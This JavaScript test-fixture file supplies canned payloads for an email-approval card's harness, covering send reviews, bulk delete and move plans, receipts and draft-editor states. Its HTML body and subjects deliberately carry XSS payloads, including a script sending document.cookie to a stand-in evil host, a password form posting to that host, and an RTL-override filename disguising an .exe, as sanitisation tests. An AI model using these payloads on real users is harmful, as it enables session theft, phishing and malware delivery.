// ---------------------------------------------------------------------------
// Canned contract-shaped payloads for the local harness.
//
// These are NOT test data in the "happy path" sense: subjects, sender names,
// filenames and HTML bodies deliberately carry markup, control characters and
// injection attempts, because every one of those fields originates from email
// and is attacker-controlled.
// ---------------------------------------------------------------------------

const V = "review-card-v1";

const HOSTILE_HTML = `
<div style="color:red">Hi <b>Dana</b>,</div>
<p>Numbers for Q3 are attached. Full detail in the
   <a href="https://example.com/q3?ref=1">shared folder</a>, and the mirror at
   <a href="javascript:alert(document.domain)">this link</a>.</p>
<img src="https://tracker.example.net/pixel.gif?u=42" alt="tracking pixel" width="1" height="1">
<script>fetch('https://evil.example/'+document.cookie)</script>
<scr<script>ipt>alert(1)</scr</script>ipt>
<iframe src="https://evil.example/frame"></iframe>
<svg onload="alert(2)"><circle r="10"/></svg>
<div onmouseover="alert(3)" onclick=alert(4)>Hover me</div>
<form action="https://evil.example/steal"><input name="pw" type="password"><button>Send</button></form>
<table><tr><th scope="col">Region</th><th>Revenue</th></tr>
<tr><td>EU</td><td>412,000</td></tr><tr><td>NA</td><td>388,500</td></tr></table>
<blockquote>On 30 Jul, Dana wrote: can you send the Q3 numbers?</blockquote>
<p>Thanks,<br>Asgeir</p>
<style>body{display:none}</style>
<!--[if IE]><script>alert(5)</script><![endif]-->
`;

const BODY_TEXT = `Hi Dana,

Numbers for Q3 are attached. Full detail is in the shared folder.

Regional split:
  EU  412,000
  NA  388,500

On 30 Jul, Dana wrote: can you send the Q3 numbers?

Thanks,
Asgeir`;

const iso = (minutesFromNow) =>
  new Date(Date.now() + minutesFromNow * 60000).toISOString();

const GMAIL_PROVIDER = {
  label: "Gmail API",
  route: "users.messages.send",
  caveats: [
    "The message is sent from your Gmail account and appears in Sent.",
    "Gmail rewrites the Message-ID; threading uses the original References header.",
  ],
};

const SMTP_PROVIDER = {
  label: "IMAP + SMTP",
  route: "SMTP submission · smtp.fastmail.com:465",
  caveats: [
    "Sent over SMTP; a copy is appended to the Sent folder over IMAP.",
    "Delivery failures arrive later as a bounce, not as an error here.",
  ],
};

export const outboundGmail = {
  schema_version: V,
  card: "outbound_review",
  state: "pending",
  provider: GMAIL_PROVIDER,
  actor: { can_decide: true, reason: null },
  outbound: {
    approval_id: "8f2a1c74-0f3e-4a91-9c2b-1d6f0e5a7b33",
    operation: "email_reply",
    created_at: iso(-4),
    expires_at: iso(60 * 23),
    send_at: null,
    review_url:
      "https://mcpemails.com/approvals/8f2a1c74-0f3e-4a91-9c2b-1d6f0e5a7b33",
    identity: {
      inbox_id: "b1d0a2e4-77aa-4c11-9f31-2c9d8e6a1b02",
      email_address: "asgeir@mcpemails.com",
      display_name: "Asgeir Albretsen",
      provider: "gmail",
      service: null,
    },
    recipients: {
      to: ["dana@northwind.example", "ops@northwind.example"],
      cc: ["finance@northwind.example"],
      bcc_count: 2,
    },
    subject: "Re: Q3 numbers <script>alert('subject')</script> — final",
    body: { text: BODY_TEXT, html: HOSTILE_HTML, truncated: false },
    attachments: [
      { filename: "q3.pdf", size_bytes: 184320, mime_type: "application/pdf" },
      {
        filename: "regional-split-2026-Q3-final-v4-FINAL.xlsx",
        size_bytes: 42112,
        mime_type:
          "application/vnd.openxmlformats-officedocument.spreadsheetml.sheet",
      },
      {
        filename: "invoice‮ fdp.exe",
        size_bytes: 1048576,
        mime_type: "application/octet-stream",
      },
      { filename: "notes.txt", size_bytes: 812, mime_type: "text/plain" },
    ],
    signature: {
      will_append: true,
      source: "manual",
      preview_text: "--\nAsgeir Albretsen\nMCP Emails",
    },
    requested_by: { api_key_name: "Claude desktop", client_name: "claude-ai" },
  },
};

export const outboundImapTruncated = {
  schema_version: V,
  card: "outbound_review",
  state: "pending",
  provider: SMTP_PROVIDER,
  actor: { can_decide: true, reason: null },
  outbound: {
    approval_id: "2c9d8e6a-1b02-4f77-8a3e-51ab6d904c18",
    operation: "email_send",
    created_at: iso(-1),
    expires_at: iso(47),
    send_at: null,
    review_url:
      "https://mcpemails.com/approvals/2c9d8e6a-1b02-4f77-8a3e-51ab6d904c18",
    identity: {
      inbox_id: "51ab6d90-4c18-4a2f-9d77-8e6a1b022c9d",
      email_address: "hello@a-fairly-long-domain-name.example",
      display_name: null,
      provider: "imap",
      service: "fastmail",
    },
    recipients: {
      to: [
        "a.very.long.recipient.address@enterprise-customer.example",
        "second@x.example",
        "third@x.example",
        "fourth@x.example",
      ],
      cc: [],
      bcc_count: 0,
    },
    subject:
      "Weekly digest for a customer with an unreasonably long subject line that has to wrap gracefully at 320 pixels",
    body: {
      text: BODY_TEXT + "\n\n" + "…".repeat(200),
      html: null,
      truncated: true,
    },
    attachments: [],
    signature: { will_append: false, source: null, preview_text: null },
    requested_by: { api_key_name: "CI bot", client_name: null },
  },
};

export const outboundViewerBlocked = {
  ...outboundGmail,
  actor: { can_decide: false, reason: "viewer_role" },
};

export const outboundScheduled = {
  ...outboundGmail,
  state: "pending",
  outbound: { ...outboundGmail.outbound, send_at: iso(60 * 18) },
};

export const bulkDelete = {
  schema_version: V,
  card: "bulk_plan",
  state: "pending",
  provider: {
    label: "Gmail API",
    route: "users.messages.batchDelete",
    caveats: [
      "Delete moves the message to Trash. Permanent delete is not available on Gmail.",
      "Trash empties itself after 30 days.",
    ],
  },
  actor: { can_decide: true, reason: null },
  plan: {
    plan_id: "aa11bb22-cc33-4d44-9e55-ff6677889900",
    operation: "email_delete",
    action: "search_and_delete",
    expires_at: iso(15),
    inbox: {
      inbox_id: "b1d0a2e4-77aa-4c11-9f31-2c9d8e6a1b02",
      email_address: "asgeir@mcpemails.com",
      provider: "gmail",
    },
    scope: {
      kind: "search",
      description: "unread from news@ received before 1 Jul 2026",
      folder: "INBOX",
      destination: null,
    },
    match_count: 128,
    sample: [
      {
        from: "news@example.com",
        subject: "Weekly digest <b>#42</b>",
        date: "2026-07-30T08:12:00Z",
      },
      {
        from: "news@example.com",
        subject: "Your Monday briefing",
        date: "2026-07-27T06:02:00Z",
      },
      {
        from: "no-reply@notifications.example.org",
        subject:
          "Security digest for a subject line that is far too long to fit on one line",
        date: "2026-07-24T18:44:00Z",
      },
      {
        from: "news@example.com",
        subject: "Weekly digest #41",
        date: "2026-07-23T08:10:00Z",
      },
      {
        from: "news@example.com",
        subject: "Weekly digest #40",
        date: "2026-07-16T08:11:00Z",
      },
    ],
    sample_truncated: true,
  },
};

export const bulkMove = {
  schema_version: V,
  card: "bulk_plan",
  state: "pending",
  provider: {
    label: "Gmail API",
    route: "users.messages.batchModify",
    caveats: [
      "A move adds the destination label and removes INBOX; other labels remain.",
    ],
  },
  actor: { can_decide: true, reason: null },
  plan: {
    plan_id: "bb22cc33-dd44-4e55-9f66-001122334455",
    operation: "email_organize",
    action: "search_and_move",
    expires_at: iso(15),
    inbox: {
      inbox_id: "b1d0a2e4-77aa-4c11-9f31-2c9d8e6a1b02",
      email_address: "asgeir@mcpemails.com",
      provider: "gmail",
    },
    scope: {
      kind: "search",
      description: "receipts from billing@ older than 90 days",
      folder: "INBOX",
      destination: "Archive/Receipts",
    },
    match_count: 7,
    sample: [
      {
        from: "billing@acme.test",
        subject: "Invoice #4021",
        date: "2026-04-02T09:00:00Z",
      },
      {
        from: "billing@acme.test",
        subject: "Invoice #3980",
        date: "2026-03-02T09:00:00Z",
      },
    ],
    sample_truncated: false,
  },
};

export const receiptSent = {
  schema_version: V,
  card: "receipt",
  state: "sent",
  receipt: {
    outcome: "sent",
    headline: "Sent to dana@northwind.example",
    detail: "Delivered via Gmail API at 10:04.",
    affected_count: 1,
    dashboard_path: "/dashboard/approvals",
    error_code: null,
  },
};

export const receiptRejected = {
  schema_version: V,
  card: "receipt",
  state: "rejected",
  receipt: {
    outcome: "rejected",
    headline: "Rejected. Nothing was sent.",
    detail: "The queued reply to dana@northwind.example was discarded.",
    affected_count: 0,
    dashboard_path: "/dashboard/approvals",
    error_code: null,
  },
};

export const receiptExecuted = {
  schema_version: V,
  card: "receipt",
  state: "executed",
  receipt: {
    outcome: "executed",
    headline: "Moved 128 messages to Trash",
    detail: "Gmail keeps them recoverable for 30 days.",
    affected_count: 128,
    dashboard_path: "/dashboard",
    error_code: null,
  },
};

export const receiptExpired = {
  schema_version: V,
  card: "receipt",
  state: "expired",
  receipt: {
    outcome: "expired",
    headline: "Expired. Nothing was sent.",
    detail: "This approval passed its 24-hour window.",
    affected_count: 0,
    dashboard_path: null,
    error_code: null,
  },
};

export const receiptFailed = {
  schema_version: V,
  card: "receipt",
  state: "error",
  receipt: {
    outcome: "failed",
    headline: "Could not send",
    detail: "The SMTP server rejected the message.",
    affected_count: 0,
    dashboard_path: "/dashboard/approvals",
    error_code: "smtp_550_relay_denied",
  },
};

export const receiptDecidedElsewhere = {
  schema_version: V,
  card: "receipt",
  state: "decided_elsewhere",
  receipt: {
    outcome: "decided_elsewhere",
    headline: "Already approved in the dashboard",
    detail: "Someone on your workspace decided this a moment ago.",
    affected_count: 1,
    dashboard_path: "/dashboard/approvals",
    error_code: null,
  },
};

export const unknownVersion = {
  ...outboundGmail,
  schema_version: "review-card-v9",
};

/** Envelope missing the payload its discriminator promises. */
export const malformed = {
  schema_version: V,
  card: "outbound_review",
  state: "pending",
};

/**
 * NOT AN ENVELOPE, AND NOT SUPPOSED TO BE.
 *
 * `_meta.ui` is per-tool, not per-call, so the host renders the card for EVERY
 * result of a UI-bearing tool. Two of those happen in production:
 *
 *   * an API key spanning one opted-in and one opted-out inbox gets the card
 *     metadata on `email_delete`, so a delete on the opted-out inbox arrives
 *     here as today's ordinary payload;
 *   * `email_organize`'s non-plannable actions (`copy_batch`, `flag`,
 *     `archive`) never produce a plan.
 *
 * This is exactly what `email_delete` returns in those cases. The operation
 * SUCCEEDED. The card must render nothing at all and let the host's own text
 * result stand — a "this review could not be displayed" warning underneath a
 * successful delete invents a problem that does not exist.
 *
 * Contrast `malformed` above, which DOES carry `schema_version`: that one is
 * ours and unreadable, and stays loud.
 */
export const nonEnvelope = {
  status: "deleted",
  inbox_id: "e1a2c3d4-0000-4000-8000-000000000001",
  message_ids: ["18f2a4c7e9b1d3f5"],
  deleted_count: 1,
  permanent: false,
  folder: "INBOX",
};

// ---------------------------------------------------------------------------
// A HELD SEND, exactly as the server now returns it.
//
// This is the payload the whole MCP Apps outbound path exists for, and until
// 2026-08-25 the card could never see it. A gated email_compose / draft /
// schedule call returned only the flat `pending_approval` object below, with no
// `schema_version`, so `classifyResult` called it "foreign" and the card drew
// nothing. The one producer of an `outbound_review` envelope was the app-only
// `approval_review`, which the card calls FROM an already-rendered card, so the
// card rendered only if it was already rendered.
//
// `index.ts#heldSendResult` now merges the envelope over the pending-approval
// keys, and that merge rule is reproduced here by construction (spread of the
// pending keys, then spread of a real envelope fixture) rather than transcribed
// from a server response, so it cannot drift on the envelope side. The
// server-side half of the same property, that the two key sets are disjoint and
// that neither channel leaks the body into model context, is pinned in
// supabase/functions/mcp-server/mcp-app-approvals.test.ts.
//
// The point of having it here: `state-machine.mjs` runs the REAL, shipped
// `classifyResult` over it. If this ever stops classifying as "envelope", the
// card is back to rendering nothing on the send it was built to review.
// ---------------------------------------------------------------------------
export const heldSendMerged = {
  // ── the published pending-approval keys, unchanged ──────────────────────
  status: "pending_approval",
  approval_id: "8f2a1c74-0f3e-4a91-9c2b-1d6f0e5a7b33",
  inbox_id: "b1d0a2e4-77aa-4c11-9f31-2c9d8e6a1b02",
  review_url:
    "https://mcpemails.com/approvals/8f2a1c74-0f3e-4a91-9c2b-1d6f0e5a7b33",
  message:
    "This reply has not been sent. It is waiting for a person to approve it: " +
    "open https://mcpemails.com/approvals/8f2a1c74-0f3e-4a91-9c2b-1d6f0e5a7b33 " +
    'to approve (sign-in required), or call approval_decide with decision "reject" to discard it.',
  // ── the contract §1 envelope, merged on top ─────────────────────────────
  ...outboundGmail,
  dashboard_url: "https://mcpemails.com/dashboard/approvals",
};

/**
 * The same held send as it looked BEFORE the fix: the pending-approval keys and
 * nothing else. Kept as the negative control, because "envelope" is only a
 * meaningful assertion next to the payload that did not classify as one.
 */
export const heldSendLegacy = {
  status: heldSendMerged.status,
  approval_id: heldSendMerged.approval_id,
  inbox_id: heldSendMerged.inbox_id,
  review_url: heldSendMerged.review_url,
  message: heldSendMerged.message,
};

// ---------------------------------------------------------------------------
// DRAFT EDITOR (contract §8)
//
// Two providers, because the two halves of the feature only show up one per
// provider: IMAP has `id_is_stable: false`, so the card has to adopt a new
// draft_id on every save or its next call 404s, and Gmail is where a draft with
// attachments demonstrates the save refusal. Hostile strings throughout for the
// same reason as everything else in this file: a draft subject and the reply
// metadata come from whoever wrote the message being answered.
// ---------------------------------------------------------------------------

const IMAP_DRAFT_PROVIDER = {
  label: "IMAP + SMTP",
  route: "APPEND to Drafts",
  caveats: [
    "This provider stores a new copy on every save, so the draft gets a new id each time.",
    "Sending goes out over SMTP and a copy is appended to Sent.",
  ],
};

export const draftEditorImap = {
  schema_version: V,
  card: "draft_editor",
  state: "editing",
  dashboard_url: "https://mcpemails.com/dashboard",
  provider: IMAP_DRAFT_PROVIDER,
  actor: { can_edit: true, reason: null },
  draft: {
    draft_id: "Drafts:2",
    id_is_stable: false,
    origin: "reply",
    last_saved_at: iso(-6),
    last_saved_by: "agent",
    identity: {
      inbox_id: "51ab6d90-4c18-4a2f-9d77-8e6a1b022c9d",
      email_address: "demo@mcpemails.com",
      display_name: "Asgeir Albretsen",
      provider: "imap",
      service: "migadu",
    },
    recipients: {
      to: ["dana@northwind.example"],
      cc: [],
      bcc: ["archive@mcpemails.example"],
    },
    subject: "Re: Q3 numbers <script>alert('draft')</script>",
    body: {
      text:
        "Hi Dana,\n\nHere are the Q3 numbers. Shout if anything looks off.\n\n" +
        "On Tue, 15 Sep 2026, dana@northwind.example wrote:\n" +
        "> Can you send the Q3 numbers?\n\n" +
        // The stored body carries the signature inline, which is what
        // `signature: { embedded: true }` below has always claimed and the
        // fixture never actually showed. The card splits on the RFC 3676
        // separator to dim it; without it here, that path shipped untested
        // against the reference host.
        "-- \nDemo User\nMCP Emails\nmcpemails.com",
      html: null,
      truncated: false,
    },
    attachments: [],
    signature: { embedded: true },
    in_reply_to: {
      message_id: "INBOX:42",
      subject: "Q3 numbers",
      from: "dana@northwind.example",
      date: "2026-09-15T09:12:00Z",
    },
    can_send: true,
  },
};

export const draftEditorGmailAttachments = {
  schema_version: V,
  card: "draft_editor",
  state: "editing",
  dashboard_url: "https://mcpemails.com/dashboard",
  provider: {
    label: "Gmail API",
    route: "users.drafts.update",
    caveats: ["The draft lives in Gmail and is visible in the Gmail web client."],
  },
  actor: { can_edit: true, reason: null },
  draft: {
    draft_id: "r-8814402299118",
    id_is_stable: true,
    origin: "create",
    last_saved_at: iso(-90),
    last_saved_by: "agent",
    identity: {
      inbox_id: "b1d0a2e4-77aa-4c11-9f31-2c9d8e6a1b02",
      email_address: "asgeir@mcpemails.com",
      display_name: null,
      provider: "gmail",
      service: null,
    },
    recipients: {
      to: ["ops@northwind.example", "finance@northwind.example"],
      cc: ["dana@northwind.example"],
      bcc: [],
    },
    subject: "Q3 pack, with the regional split attached",
    body: { text: BODY_TEXT, html: HOSTILE_HTML, truncated: false },
    attachments: [
      { filename: "q3.pdf", size_bytes: 184320, mime_type: "application/pdf" },
      {
        filename: "invoice‮ fdp.exe",
        size_bytes: 1048576,
        mime_type: "application/octet-stream",
      },
    ],
    signature: { embedded: false },
    in_reply_to: null,
    can_send: true,
  },
};

/** A save refused because the draft carries attachments. Nothing changed. */
export const draftErrorAttachments = {
  schema_version: V,
  card: "draft_editor",
  state: "error",
  dashboard_url: "https://mcpemails.com/dashboard",
  receipt: {
    outcome: "failed",
    headline: "Not saved. This draft has attachments.",
    detail: "Saving rebuilds the message and would drop them, so nothing was changed.",
    affected_count: 0,
    error_code: "draft_has_attachments",
  },
};

/**
 * A stale id. Deliberately carries NO `draft`: the card must keep the one it is
 * already showing, with the user's unsaved text intact, and offer Refresh.
 */
export const draftErrorNotFound = {
  schema_version: V,
  card: "draft_editor",
  state: "error",
  dashboard_url: "https://mcpemails.com/dashboard",
  receipt: {
    outcome: "failed",
    headline: "That draft no longer exists.",
    detail: "On IMAP every save writes a new draft and retires the old one.",
    affected_count: 0,
    error_code: "draft_not_found",
  },
};

/**
 * `draft{action:"send"}`, not held: today's payload with the receipt keys
 * merged on top, exactly as §8's table specifies and §2a already does for the
 * held send. Built by spreading the published keys and then the envelope, so
 * the disjointness is a property of the construction, not a transcription.
 */
export const draftSendReceiptMerged = {
  draft_id: "Drafts:3",
  message_id: "<20260916T100400.9f2@mcpemails.com>",
  sent_at: iso(0),
  schema_version: V,
  card: "receipt",
  state: "sent",
  dashboard_url: "https://mcpemails.com/dashboard",
  receipt: {
    outcome: "sent",
    headline: "Sent to dana@northwind.example",
    detail: "Sent over SMTP and copied to Sent.",
    affected_count: 1,
    dashboard_url: "https://mcpemails.com/dashboard",
    error_code: null,
  },
};

/** `draft{action:"delete"}`: the same merge, outcome "discarded". */
export const draftDeleteReceiptMerged = {
  draft_id: "Drafts:3",
  deleted: true,
  schema_version: V,
  card: "receipt",
  state: "rejected",
  dashboard_url: "https://mcpemails.com/dashboard",
  receipt: {
    outcome: "discarded",
    headline: "Draft discarded. Nothing was sent.",
    detail: "The draft was deleted at your provider.",
    affected_count: 0,
    dashboard_url: "https://mcpemails.com/dashboard",
    error_code: null,
  },
};
